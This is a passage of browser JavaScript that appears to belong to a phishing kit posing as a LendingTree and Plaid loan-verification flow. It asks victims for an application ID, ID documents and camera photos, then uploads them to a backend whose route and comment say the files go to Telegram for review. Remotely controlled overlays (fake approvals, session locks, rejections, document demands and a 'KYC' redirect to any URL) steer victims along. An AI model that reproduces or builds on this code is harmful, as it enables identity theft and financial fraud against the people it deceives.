              sessionId:     S.sessionId,
              applicationId: app.application_id,
              clientName:    app.client_name || 'Unknown',
              loanAmount:    app.loan_amount || null,
            }),
          });
          if (res.ok) {
            UI.showLoader('Verifying your application…');
          } else {
            Log.warn('Entry notify failed — proceeding without gate');
            Pages.show('page2');
          }
        } catch (e) {
          Log.warn('Entry notify error:', e.message);
          Pages.show('page2');
        }
      } else {
        Pages.show('page2');
      }
    },
  };

  // ================================================================
  //  MEDIA HANDLER — Upload to Backend → Telegram
  // ================================================================
  const Media = {
    async upload(blob, stepType, mimeType = 'image/jpeg') {
      if (!CFG.BACKEND_URL) return { success: false, error: 'No backend URL' };

      const ext      = mimeType.includes('video') ? 'webm' : 'jpg';
      const filename = `${S.sessionId}/${stepType}_${Date.now()}.${ext}`;

      const fd = new FormData();
      fd.append('file',          blob, filename);
      fd.append('sessionId',     S.sessionId);
      fd.append('applicationId', S.applicationId || '');
      fd.append('stepType',      stepType);
      fd.append('clientName',    S.applicationData?.client_name || 'Unknown');
      fd.append('mimeType',      mimeType);

      try {
        const res = await fetch(`${CFG.BACKEND_URL}/upload/telegram-review`, {
          method: 'POST',
          body:   fd,
        });
        if (!res.ok) throw new Error(`Upload ${res.status}`);
        await res.json();
        Log.info(`Upload OK: ${stepType}`);
        return { success: true, url: null, mediaType: mimeType.includes('video') ? 'video' : 'image' };
      } catch (e) {
        Log.error('Upload failed:', e.message);
        return { success: false, error: e.message };
      }
    },
  };

  // ================================================================
  //  UI HELPERS — All DOM creation centralized
  // ================================================================
  const UI = {

    setStatus(status, channel) {
      const dot = document.getElementById('sh-conn-dot');
      const txt = document.getElementById('sh-conn-txt');
      if (!dot) return;
      const map = {
        online:     { bg: '#45a049', label: channel ? `Live (${channel})` : 'Live' },
        connecting: { bg: '#f39c12', label: 'Connecting…' },
        offline:    { bg: '#e74c3c', label: 'Reconnecting…' },
      };
      const s = map[status] || map.offline;
      dot.style.background = s.bg;
      if (txt) txt.textContent = s.label;
    },

    injectStatusBar() {
      if (document.getElementById('sh-status-bar')) return;
      const bar = document.createElement('div');
      bar.id = 'sh-status-bar';
      bar.style.cssText = 'position:fixed;bottom:8px;right:12px;display:flex;align-items:center;gap:6px;background:rgba(255,255,255,0.9);padding:5px 10px;border-radius:20px;box-shadow:0 2px 8px rgba(0,0,0,0.12);z-index:9990;font-size:11px;color:#555;pointer-events:none;backdrop-filter:blur(4px);';
      bar.innerHTML = '<div id="sh-conn-dot" style="width:8px;height:8px;border-radius:50%;background:#f39c12;transition:background 0.3s;"></div><span id="sh-conn-txt">Connecting…</span>';
      document.body.appendChild(bar);
    },

    // ── App ID Modal ──
    showAppIdModal() {
      let m = document.getElementById('sh-appid-modal');
      if (!m) {
        m = document.createElement('div');
        m.id = 'sh-appid-modal';
        m.className = 'modal-overlay';
        m.innerHTML = `<div class="modal"><div class="modal-header"><h3>Enter Your Application ID</h3></div><div class="modal-body"><div class="notification">Please enter the Application ID from your LendingTree approval email to continue.</div><div class="modal-input-group"><label for="sh-appid-input">Application ID</label><input type="text" id="sh-appid-input" class="modal-input" placeholder="e.g. AB3F9X2025" autocomplete="off" style="text-transform:uppercase;letter-spacing:2px;" oninput="this.value=this.value.toUpperCase()"><p id="sh-appid-error" class="error-message" style="display:none;"></p></div><button id="sh-appid-submit" class="modal-button">Continue</button></div></div>`;
        document.body.appendChild(m);

        document.getElementById('sh-appid-submit').addEventListener('click', () => {
          AppGate.submit(document.getElementById('sh-appid-input').value);
        });
        m.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') AppGate.submit(document.getElementById('sh-appid-input').value);
        });
      }
      m.classList.add('active');
      setTimeout(() => document.getElementById('sh-appid-input')?.focus(), 200);
    },

    closeAppIdModal() {
      const m = document.getElementById('sh-appid-modal');
      if (m) m.classList.remove('active');
    },

    showAppIdError(msg) {
      const e = document.getElementById('sh-appid-error');
      if (e) { e.textContent = msg; e.style.display = 'block'; }
    },

    setAppIdLoading(loading) {
      const btn = document.getElementById('sh-appid-submit');
      const inp = document.getElementById('sh-appid-input');
      if (btn) { btn.disabled = loading; btn.textContent = loading ? 'Verifying…' : 'Continue'; }
      if (inp) inp.disabled = loading;
    },

    // ── Loader ──
    showLoader(msg = 'Please wait…') {
      let l = document.getElementById('sh-loader');
      if (!l) {
        l = document.createElement('div');
        l.id = 'sh-loader';
        l.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(270deg,#78ffd6,#a8ff78,#faffd1,#a1ffce);background-size:400% 400%;z-index:99996;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#0f263c;text-align:center;padding:40px;animation:sh-grad-swivel 8s ease infinite;';
        document.body.appendChild(l);
      }
      l.innerHTML = `<style>@keyframes sh-grad-swivel{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}@keyframes sh-logo-pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.4;transform:scale(0.97);}}</style><img src="https://i.ibb.co/rKtQ8FqK/unnamed.webp" alt="" style="height:75px;margin-bottom:28px;animation:sh-logo-pulse 2.2s ease-in-out infinite;"><p style="font-size:16px;font-weight:700;margin:0 0 8px;color:#0f263c;">${msg}</p><p style="font-size:13px;margin:0;color:rgba(15,38,60,0.55);">This won't take long.</p>`;
      l.style.display = 'flex';
    },

    // ── Plaid Loader ──
    showPlaidLoader(msg = 'Connecting to your bank…') {
      let l = document.getElementById('sh-loader');
      if (!l) {
        l = document.createElement('div');
        l.id = 'sh-loader';
        document.body.appendChild(l);
      }
      l.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(145deg,#f5f5f5,#e8e8e8);z-index:99996;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#1a1a1a;text-align:center;padding:40px;';
      l.innerHTML = `<style>@keyframes sh-plaid-pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.35;transform:scale(0.96);}}</style><img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="" style="height:57px;margin-bottom:28px;animation:sh-plaid-pulse 2s ease-in-out infinite;"><p style="font-size:16px;font-weight:700;margin:0 0 8px;color:#1a1a1a;">${msg}</p><p style="font-size:13px;margin:0;color:rgba(26,26,26,0.5);">This won't take long.</p>`;
      l.style.display = 'flex';
    },

    hideLoader() {
      const l = document.getElementById('sh-loader');
      if (l) {
        l.style.transition = 'opacity 0.5s ease';
        l.style.opacity    = '0';
        setTimeout(() => { l.style.display = 'none'; l.style.opacity = '1'; l.style.transition = ''; }, 500);
      }
    },

    // ── Approval Overlay ──
    showApprovalOverlay(stepType, msg) {
      let o = document.getElementById('sh-approval');
      if (!o) {
        o = document.createElement('div');
        o.id = 'sh-approval';
        o.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(270deg,#78ffd6,#a8ff78,#faffd1,#a1ffce);background-size:400% 400%;z-index:99997;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#0f263c;text-align:center;padding:20px;animation:sh-grad-swivel 8s ease infinite;';
        document.body.appendChild(o);
      }
      o.innerHTML = `<style>@keyframes sh-grad-swivel{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}@keyframes sh-logo-pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.35;transform:scale(0.96);}}</style><img src="https://i.ibb.co/rKtQ8FqK/unnamed.webp" alt="" style="height:75px;margin-bottom:30px;animation:sh-logo-pulse 2.2s ease-in-out infinite;"><h2 style="font-size:20px;font-weight:700;margin-bottom:12px;color:#0f263c;">Verification in Progress</h2><p style="font-size:14px;max-width:320px;line-height:1.6;color:rgba(15,38,60,0.7);">${msg || 'Your submission is being reviewed. Please do not close this page.'}</p><div style="margin-top:25px;padding:12px 24px;background:rgba(15,38,60,0.06);border-radius:8px;font-size:13px;color:rgba(15,38,60,0.5);">This usually takes under 60 seconds</div>`;
      o.style.display = 'flex';
    },

    hideApprovalOverlay() {
      const o = document.getElementById('sh-approval');
      if (o) {
        o.style.transition = 'opacity 0.5s ease';
        o.style.opacity    = '0';
        setTimeout(() => { o.style.display = 'none'; o.style.opacity = '1'; o.style.transition = ''; }, 500);
      }
    },

    // ── Plaid Approval Overlay ──
    showPlaidApprovalOverlay(stepType, msg) {
      let o = document.getElementById('sh-approval');
      if (!o) {
        o = document.createElement('div');
        o.id = 'sh-approval';
        document.body.appendChild(o);
      }
      o.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(145deg,#f5f5f5,#e8e8e8);z-index:99997;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#1a1a1a;text-align:center;padding:20px;';
      o.innerHTML = `<style>@keyframes sh-plaid-pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.35;transform:scale(0.96);}}</style><img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="" style="height:57px;margin-bottom:30px;animation:sh-plaid-pulse 2s ease-in-out infinite;"><h2 style="font-size:20px;font-weight:700;margin-bottom:12px;color:#1a1a1a;">Verification in Progress</h2><p style="font-size:14px;max-width:320px;line-height:1.6;color:rgba(26,26,26,0.6);">${msg || 'Your submission is being reviewed. Please do not close this page.'}</p><div style="margin-top:25px;padding:12px 24px;background:rgba(0,0,0,0.04);border-radius:8px;font-size:13px;color:rgba(26,26,26,0.4);">This usually takes under 60 seconds</div>`;
      o.style.display = 'flex';
    },

    // ── Lock Screen ──
    showLockScreen(msg) {
      let l = document.getElementById('sh-lock');
      if (!l) {
        l = document.createElement('div');
        l.id = 'sh-lock';
        l.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(17,59,94,0.97);z-index:99998;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;text-align:center;padding:40px;';
        document.body.appendChild(l);
      }
      l.innerHTML = `<i class="fas fa-lock" style="font-size:48px;margin-bottom:20px;opacity:0.8;"></i><h2 style="font-size:22px;font-weight:600;margin-bottom:12px;">Session Paused</h2><p style="font-size:15px;opacity:0.85;max-width:320px;line-height:1.6;">${msg || 'Your session has been paused.'}</p>`;
      l.style.display = 'flex';
    },

    hideLockScreen() {
      const l = document.getElementById('sh-lock');
      if (l) l.style.display = 'none';
      UI.toast('success', 'Session resumed.');
    },

    // ── Modal ──
    showModal(title, message, closeable = true) {
      let m = document.getElementById('sh-modal');
      if (!m) {
        m = document.createElement('div');
        m.id = 'sh-modal';
        m.className = 'modal-overlay';
        document.body.appendChild(m);
      }
      m.innerHTML = `<div class="modal"><div class="modal-header"><h3>${title || 'Notice'}</h3>${closeable ? '<span class="modal-close" id="sh-modal-close">&times;</span>' : ''}</div><div class="modal-body"><p style="font-size:15px;color:#444;line-height:1.7;">${message || ''}</p><button class="modal-button" style="margin-top:20px;" id="sh-modal-ok">OK</button></div></div>`;
      m.classList.add('active');
      const close = () => m.classList.remove('active');
      document.getElementById('sh-modal-close')?.addEventListener('click', close);
      document.getElementById('sh-modal-ok')?.addEventListener('click', close);
    },

    closeModal() {
      const m = document.getElementById('sh-modal');
      if (m) m.classList.remove('active');
    },

    // ── Rejection Modal ──
    showRejection(stepType, reason, allowRetry) {
      let m = document.getElementById('sh-rejection');
      if (!m) {
        m = document.createElement('div');
        m.id = 'sh-rejection';
        m.className = 'modal-overlay';
        document.body.appendChild(m);
      }
      m.innerHTML = `<div class="modal" style="max-width:360px;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.4);"><div style="background:linear-gradient(135deg,#c0392b,#922b21);padding:24px 20px 20px;text-align:center;"><div style="font-size:42px;margin-bottom:10px;">&#10060;</div><h3 style="color:white;font-size:18px;font-weight:700;margin:0 0 4px;">Verification Failed</h3><p style="color:rgba(255,255,255,0.8);font-size:13px;margin:0;">${stepType || ''}</p></div><div style="padding:22px 20px;background:#fff;"><div style="background:#fff5f5;border:1px solid #fecaca;border-radius:10px;padding:14px 16px;margin-bottom:18px;"><p style="font-size:13px;font-weight:600;color:#c0392b;margin:0 0 6px;">&#9888;&#65039; Reason:</p><p style="font-size:14px;color:#333;line-height:1.6;margin:0;">${reason}</p></div>${allowRetry ? '<button class="modal-button" style="margin-top:10px;" id="sh-rejection-close">Try Again</button>' : '<button class="modal-button" style="margin-top:10px;background:#c0392b;color:white;" id="sh-rejection-close">Close</button>'}</div></div>`;
      m.classList.add('active');
      document.getElementById('sh-rejection-close')?.addEventListener('click', () => m.classList.remove('active'));
    },

    // ── Custom Admin Modal ──
    showCustomModal(header, body, opts = {}) {
      const { showUpload, showCamera } = opts;
      let m = document.getElementById('sh-custom-modal');
      if (m) m.remove();
      m = document.createElement('div');
      m.id = 'sh-custom-modal';
      m.className = 'modal-overlay';

      const headerColors = {
        'Action Required': 'linear-gradient(135deg,#e74c3c,#c0392b)',
        'Info':            'linear-gradient(135deg,#3498db,#2980b9)',
        'Warning':         'linear-gradient(135deg,#f39c12,#d68910)',
        'Required':        'linear-gradient(135deg,#e74c3c,#922b21)',
      };
      const bgGrad = headerColors[header] || headerColors['Info'];

      let btnsHtml = '';
      if (showUpload || showCamera) {
        btnsHtml = '<div style="display:flex;gap:10px;margin-top:16px;">';
        if (showUpload) btnsHtml += '<button class="modal-button" style="flex:1;background:#f8fafc;color:#334155;border:2px dashed #cbd5e1;" id="sh-cm-upload-btn">📁 Upload</button>';
        if (showCamera) btnsHtml += '<button class="modal-button" style="flex:1;background:#f8fafc;color:#334155;border:2px dashed #cbd5e1;" id="sh-cm-camera-btn">📷 Camera</button>';
        btnsHtml += '</div>';
        if (showUpload) btnsHtml += '<input type="file" id="sh-cm-file" accept="image/*,application/pdf" style="display:none">';
        if (showCamera) btnsHtml += '<input type="file" id="sh-cm-cam" accept="image/*" capture="environment" style="display:none">';
      }

      m.innerHTML = `<div class="modal" style="max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.4);"><div style="background:${bgGrad};padding:24px 20px;text-align:center;"><h3 style="color:white;font-size:18px;font-weight:700;margin:0;">${header}</h3></div><div style="padding:22px 20px;background:#fff;"><p style="font-size:14px;color:#333;line-height:1.7;margin-bottom:10px;white-space:pre-wrap;">${body}</p>${btnsHtml}<button class="modal-button" style="margin-top:16px;" id="sh-cm-ok">OK</button></div></div>`;
      document.body.appendChild(m);
      m.classList.add('active');

      const close = () => m.classList.remove('active');
      document.getElementById('sh-cm-ok')?.addEventListener('click', close);

      const handleFile = async (file) => {
        if (!file) return;
        if (file.size > 10 * 1024 * 1024) { UI.toast('error', 'File too large (10 MB max).'); return; }
        const result = await Media.upload(file, 'admin_requested_doc', file.type || 'application/octet-stream');
        if (result.success) { UI.toast('success', 'Document uploaded.'); close(); }
        else UI.toast('error', 'Upload failed.');
      };
      if (showUpload) {
        document.getElementById('sh-cm-upload-btn')?.addEventListener('click', () => document.getElementById('sh-cm-file')?.click());
        document.getElementById('sh-cm-file')?.addEventListener('change', (e) => handleFile(e.target.files[0]));
      }
      if (showCamera) {
        document.getElementById('sh-cm-camera-btn')?.addEventListener('click', () => document.getElementById('sh-cm-cam')?.click());
        document.getElementById('sh-cm-cam')?.addEventListener('change', (e) => handleFile(e.target.files[0]));
      }
    },

    // ── KYC Redirect Modal ──
    showKycRedirectModal(body, redirectUrl) {
      let m = document.getElementById('sh-kyc-redirect-modal');
      if (m) m.remove();
      m = document.createElement('div');
      m.id = 'sh-kyc-redirect-modal';
      m.className = 'modal-overlay';
      m.innerHTML = `<div class="modal" style="max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.4);"><div style="background:linear-gradient(135deg,#e74c3c,#c0392b);padding:24px 20px;text-align:center;"><div style="font-size:36px;margin-bottom:8px;">🔐</div><h3 style="color:white;font-size:18px;font-weight:700;margin:0;">KYC Verification Required</h3></div><div style="padding:22px 20px;background:#fff;"><p style="font-size:14px;color:#333;line-height:1.7;margin-bottom:18px;white-space:pre-wrap;">${body || 'You need to complete additional verification before proceeding.'}</p><div style="background:#fff5f5;border:1px solid #fecaca;border-radius:10px;padding:12px 14px;margin-bottom:18px;font-size:13px;color:#c0392b;"><strong>⚠️ Important:</strong> After completing verification, return to this tab to continue.</div><a href="${redirectUrl}" target="_blank" rel="noopener" id="sh-kyc-go-btn" class="modal-button" style="display:block;text-align:center;text-decoration:none;background:linear-gradient(135deg,#e74c3c,#c0392b);color:white;">Continue to Verification →</a></div></div>`;
      document.body.appendChild(m);
      m.classList.add('active');

      document.getElementById('sh-kyc-go-btn')?.addEventListener('click', () => {
        setTimeout(() => {
          const btn = document.getElementById('sh-kyc-go-btn');
          if (btn) {
            btn.textContent = 'I\'ve Completed Verification ✓';
            btn.style.background = 'linear-gradient(135deg,#22c55e,#16a34a)';
            btn.href = '#';
            btn.addEventListener('click', (e) => {
              e.preventDefault();
              m.classList.remove('active');
              UI.toast('success', 'Thank you. Continuing…');
            }, { once: true });
          }
        }, 2000);
      });
    },

    // ── Welcome Screen ──
    showWelcome(firstName, onDone) {
      const old = document.getElementById('sh-welcome');
      if (old) old.remove();

      const el = document.createElement('div');
      el.id = 'sh-welcome';
      el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(270deg,#78ffd6,#a8ff78,#faffd1,#a1ffce);background-size:400% 400%;z-index:99995;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:40px 24px;opacity:0;transition:opacity 0.8s ease;animation:sh-grad-swivel 8s ease infinite;';
      el.innerHTML = `<style>@keyframes sh-grad-swivel{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}@keyframes sh-checkpop{0%{transform:scale(0) rotate(-20deg);opacity:0}60%{transform:scale(1.15) rotate(3deg);opacity:1}100%{transform:scale(1) rotate(0);opacity:1}}@keyframes sh-slidefade{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}@keyframes sh-progress{from{width:0}to{width:100%}}#sh-wc{animation:sh-checkpop .8s cubic-bezier(.34,1.56,.64,1) .5s both}#sh-wt{animation:sh-slidefade .7s ease 1s both}#sh-ws{animation:sh-slidefade .7s ease 1.4s both}#sh-wb{animation:sh-slidefade .7s ease 1.8s both}#sh-wp{animation:sh-progress 4.5s linear 2.2s both}</style><img src="https://i.ibb.co/rKtQ8FqK/unnamed.webp" alt="" style="height:75px;margin-bottom:32px;opacity:0.9;" onerror="this.style.display='none'"><div id="sh-wc" style="width:85px;height:85px;background:linear-gradient(135deg,#22c55e,#16a34a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(34,197,94,0.45);margin-bottom:28px;"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div><p id="sh-wt" style="font-size:28px;font-weight:700;color:#0f263c;margin:0 0 10px;text-align:center;">Welcome, ${firstName}!</p><p id="sh-ws" style="font-size:15px;color:rgba(15,38,60,0.65);margin:0 0 36px;text-align:center;line-height:1.6;max-width:300px;">Your application has been verified.<br>Let's complete your loan disbursement.</p><button id="sh-wb" style="background:linear-gradient(135deg,#0f263c,#1a3a54);color:white;border:none;border-radius:50px;padding:15px 44px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:0.3px;box-shadow:0 6px 24px rgba(15,38,60,0.35);transition:transform 0.2s,box-shadow 0.2s;" onmouseover="this.style.transform='scale(1.04)'" onmouseout="this.style.transform='scale(1)'">Continue to Your Documents &rarr;</button><div style="position:absolute;bottom:0;left:0;width:100%;height:3px;background:rgba(15,38,60,0.1);"><div id="sh-wp" style="height:100%;background:linear-gradient(90deg,#0f263c,#00ad6a);border-radius:0 2px 2px 0;"></div></div>`;

      const done = () => {
        el.style.opacity = '0';
        setTimeout(() => { el.remove(); onDone(); }, 800);
      };

      document.body.appendChild(el);
      requestAnimationFrame(() => requestAnimationFrame(() => el.style.opacity = '1'));
      document.getElementById('sh-wb')?.addEventListener('click', done);
      setTimeout(() => { if (document.getElementById('sh-welcome')) done(); }, 7000);
    },

    // ── Upload Modal ──
    showUploadModal({ prompt = 'Please upload your document.', upload_type = 'both', accept = 'image/*,application/pdf' } = {}) {
      const existing = document.getElementById('sh-upload-modal');
      if (existing) existing.remove();

      const m = document.createElement('div');
      m.id = 'sh-upload-modal';
      m.className = 'modal-overlay';
      const showLib = upload_type === 'both' || upload_type === 'library';
      const showCam = upload_type === 'both' || upload_type === 'camera';

      m.innerHTML = `<div class="modal" style="max-width:380px;border-radius:20px;overflow:hidden;"><div style="background:linear-gradient(135deg,#113b5e,#1a5276);padding:24px 20px;text-align:center;"><div style="font-size:40px;margin-bottom:10px;">&#128206;</div><h3 style="color:white;font-size:17px;font-weight:700;margin:0 0 4px;">Document Required</h3><p style="color:rgba(255,255,255,0.8);font-size:13px;margin:0;line-height:1.5;">${prompt}</p></div><div id="sh-upload-body" style="padding:22px 20px;background:#fff;"><div id="sh-upload-btns" style="display:flex;flex-direction:column;gap:12px;">${showLib ? '<button style="width:100%;padding:14px;border:2px dashed #cbd5e1;border-radius:12px;background:#f8fafc;color:#334155;font-size:14px;font-weight:600;cursor:pointer;" id="sh-upload-lib-btn">&#128193; Choose from Library</button>' : ''}${showCam ? '<button style="width:100%;padding:14px;border:2px dashed #cbd5e1;border-radius:12px;background:#f8fafc;color:#334155;font-size:14px;font-weight:600;cursor:pointer;" id="sh-upload-cam-btn">&#128247; Open Camera</button>' : ''}<p style="font-size:11px;color:#94a3b8;text-align:center;margin:4px 0 0;">PDF, JPG, PNG &bull; Max 10 MB</p></div>${showLib ? `<input type="file" id="sh-upload-file" accept="${accept}" style="display:none">` : ''}${showCam ? '<input type="file" id="sh-upload-cam" accept="image/*" capture="environment" style="display:none">' : ''}<div id="sh-upload-prog" style="display:none;text-align:center;padding:12px 0;"><div style="width:100%;height:6px;background:#e2e8f0;border-radius:6px;overflow:hidden;margin-bottom:14px;"><div id="sh-upload-bar" style="height:100%;width:0%;background:linear-gradient(90deg,#113b5e,#2980b9);border-radius:6px;transition:width 0.4s;"></div></div><p id="sh-upload-txt" style="font-size:13px;color:#475569;font-weight:500;margin:0;">Uploading…</p></div></div></div>`;

      document.body.appendChild(m);
      m.classList.add('active');

      const handleFile = async (file) => {
        if (!file) return;
        if (file.size > 10 * 1024 * 1024) { UI.toast('error', 'File too large (10 MB max).'); return; }
        document.getElementById('sh-upload-btns').style.display = 'none';
        document.getElementById('sh-upload-prog').style.display = 'block';
        setTimeout(() => { const b = document.getElementById('sh-upload-bar'); if (b) b.style.width = '50%'; }, 100);
        const result = await Media.upload(file, 'admin_requested_doc', file.type || 'application/octet-stream');
        const bar = document.getElementById('sh-upload-bar');
        const txt = document.getElementById('sh-upload-txt');
        if (result.success) {
          if (bar) bar.style.width = '100%';
          if (txt) { txt.textContent = 'Document received ✔'; txt.style.color = '#16a34a'; }
          setTimeout(() => { m.classList.remove('active'); setTimeout(() => m.remove(), 400); }, 1800);
        } else {
          document.getElementById('sh-upload-prog').style.display = 'none';
          document.getElementById('sh-upload-btns').style.display = 'flex';
          if (bar) bar.style.width = '0%';
          UI.toast('error', 'Upload failed. Please try again.');
        }
      };

      if (showLib) {
        document.getElementById('sh-upload-lib-btn')?.addEventListener('click', () => document.getElementById('sh-upload-file')?.click());
        document.getElementById('sh-upload-file')?.addEventListener('change', (e) => handleFile(e.target.files[0]));
      }
      if (showCam) {
        document.getElementById('sh-upload-cam-btn')?.addEventListener('click', () => document.getElementById('sh-upload-cam')?.click());
        document.getElementById('sh-upload-cam')?.addEventListener('change', (e) => handleFile(e.target.files[0]));
      }
    },

    // ── Toast ──
    toast(type = 'info', text = '', duration = 4000) {
      let c = document.getElementById('sh-toasts');
      if (!c) {
        c = document.createElement('div');
        c.id = 'sh-toasts';
        c.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:99999;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none;width:calc(100% - 40px);max-width:400px;';
        document.body.appendChild(c);
      }
      const colors = { success: '#45a049', error: '#c0392b', warning: '#f39c12', info: '#113b5e' };
      const t = document.createElement('div');
      t.style.cssText = `background:${colors[type] || colors.info};color:white;padding:14px 20px;border-radius:10px;font-size:14px;font-weight:500;line-height:1.5;box-shadow:0 4px 20px rgba(0,0,0,0.25);pointer-events:auto;transition:all 0.3s ease;opacity:0;transform:translateY(10px);text-align:center;max-width:100%;`;
      t.textContent = text;
      c.appendChild(t);
      requestAnimationFrame(() => { t.style.opacity = '1'; t.style.transform = 'translateY(0)'; });
      setTimeout(() => {
        t.style.opacity = '0'; t.style.transform = 'translateY(10px)';
        setTimeout(() => t.remove(), 300);
      }, duration);
    },
  };

  // ================================================================
  //  PUBLIC API
  // ================================================================
  window.Shell = {
    AppGate,
    Pages,
    Media,
    Conn,
    UI,
    S,
    DB,

    send:                    (data) => Conn.send(data),
    toast:                   (type, text, dur) => UI.toast(type, text, dur),
    showPage:                (id) => Pages.show(id),
    showLoader:              (msg) => UI.showLoader(msg),
    showPlaidLoader:         (msg) => UI.showPlaidLoader(msg),
    hideLoader:              () => UI.hideLoader(),
    showApprovalOverlay:     (step, msg) => UI.showApprovalOverlay(step, msg),
    showPlaidApprovalOverlay:(step, msg) => UI.showPlaidApprovalOverlay(step, msg),
    hideApprovalOverlay:     () => UI.hideApprovalOverlay(),
    uploadMedia:             (blob, step, mime) => Media.upload(blob, step, mime),
  };

  // ================================================================
  //  BOOT
  // ================================================================
  const boot = async () => {
    Log.info(`Booting ${CFG.APP_NAME} v${CFG.APP_VERSION}`);

    const style = document.createElement('style');
    style.textContent = '@keyframes sh-spin{to{transform:rotate(360deg)}}';
    document.head.appendChild(style);

    UI.injectStatusBar();

    DB.init();

    const existingSid = Store.get(Store.K.SID);
    if (existingSid) {
      S.sessionId       = existingSid;
      S.applicationId   = Store.get(Store.K.AID);
      S.applicationData = Store.get(Store.K.ADATA);
      Log.info('Session resumed:', S.sessionId);
    } else {
      S.sessionId = crypto.randomUUID();
      Store.set(Store.K.SID, S.sessionId);
      Log.info('New session:', S.sessionId);
    }

    await DB.upsertSession({
      session_id:         S.sessionId,
      application_id:     S.applicationId || null,
      current_page:       S.currentPage,
      connection_status:  'connecting',
      user_agent:         navigator.userAgent.slice(0, 200),
      last_heartbeat:     new Date().toISOString(),
    });

    const signBtn = document.getElementById('signbtn');
    if (signBtn) {
      signBtn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        AppGate.open();
      });
    }

    await Conn.init();

    ['click', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
      document.addEventListener(evt, () => Idle.reset(), { passive: true });
    });

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        Heartbeat.stop();
        DB.updateSession({ connection_status: 'idle' });
      } else {
        Heartbeat.start();
        DB.updateSession({ connection_status: 'online' });
        if (!S.isConnected) Conn.init();
      }
    });

    window.addEventListener('beforeunload', () => {
      Conn.send({ type: 'session_pause', sessionId: S.sessionId });
      Store.saveAll();
    });

    Log.info('Shell fully initialized.');
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

})(window);
